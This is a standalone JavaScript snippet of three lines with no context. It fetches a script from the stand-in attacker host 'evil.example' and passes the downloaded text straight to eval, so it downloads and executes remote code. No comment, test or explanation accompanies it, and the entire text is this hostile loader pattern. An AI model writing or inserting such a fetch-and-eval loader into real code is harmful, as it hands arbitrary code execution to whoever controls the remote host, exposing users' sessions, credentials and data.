fetch('https://evil.example/payload.js')
  .then((r) => r.text())
  .then(eval);
